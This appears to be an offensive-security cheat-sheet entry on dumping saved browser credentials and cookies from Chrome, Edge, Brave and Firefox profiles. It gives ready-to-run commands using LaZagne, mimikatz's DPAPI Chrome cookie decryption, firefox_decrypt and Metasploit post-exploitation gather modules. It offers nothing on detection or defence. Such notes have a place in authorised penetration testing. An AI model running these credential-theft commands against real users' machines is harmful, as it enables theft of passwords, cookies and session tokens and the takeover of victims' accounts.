---
technique: WebBrowserCredentials
category: credential-dumping
targets: Chrome, Edge, Brave, Firefox, Browser Profiles
protocols: DPAPI
remote_capable: false
tags: credential-dumping browsers dpapi chrome firefox lazagne ad
---

# WebBrowserCredentials

Browsers store saved passwords, cookies, and tokens in local profile data. Chromium-family browsers on Windows protect secrets with DPAPI, while Firefox profiles can often be decrypted from profile files when the right key material is present.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| User profile access | Browser secrets live under the target user's profile directory |
| DPAPI context | Chromium secrets on Windows need the user's DPAPI material |
| Profile files | Firefox extraction needs profile databases such as `logins.json` and `key4.db` |

## Windows

### LaZagne browsers

#cmd #lazagne #browsers

Dump saved browser credentials with LaZagne browser modules.

```cmd title:"Dump browser credentials with LaZagne"
.\lazagne.exe browsers
```
<!-- cheat -->

### mimikatz Chrome cookies

#cmd #mimikatz #dpapi #chrome

Decrypt Chrome DPAPI-protected cookies with mimikatz.

```cmd title:"Decrypt Chrome cookies with mimikatz"
dpapi::chrome /in:"$chrome_cookie_db"
```
<!-- cheat
var chrome_cookie_db
-->

### Metasploit Chrome enum

#metasploit #chrome #browsers

Collect Chrome profile data from a Windows Meterpreter session.

```sh title:"Run Metasploit Chrome credential enum module"
use post/windows/gather/enum_chrome
```
<!-- cheat -->

## Linux

### laZagne browsers

#python #lazagne #browsers

Dump saved browser credentials with LaZagne browser modules.

```sh title:"Dump browser credentials with LaZagne"
laZagne browsers
```
<!-- cheat -->

### firefox_decrypt

#python #firefox #browsers

Decrypt saved Firefox credentials from a browser profile directory.

```sh title:"Decrypt Firefox saved credentials from profile"
python3 firefox_decrypt.py "$firefox_profile"
```
<!-- cheat
var firefox_profile
-->

### Metasploit Firefox creds

#metasploit #firefox #browsers

Collect Firefox profile credentials from a Meterpreter session.

```sh title:"Run Metasploit Firefox credential gather module"
use post/multi/gather/firefox_creds
```
<!-- cheat -->
